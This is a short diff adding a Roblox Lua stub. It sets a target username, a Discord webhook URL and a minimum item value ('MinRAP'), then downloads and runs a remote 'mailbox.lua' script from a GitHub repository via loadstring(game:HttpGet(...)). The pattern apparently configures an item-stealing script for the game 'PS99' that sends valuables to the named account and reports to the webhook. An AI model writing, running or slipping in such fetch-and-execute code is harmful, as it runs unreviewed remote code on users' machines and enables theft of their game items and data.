@@ -1,0 +1,4 @@
+UserName = "iRojat"
+WebHook = "https://discord.com/api/webhooks/x/x"
+MinRAP = 10000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PS99/main/mailbox.lua"))()
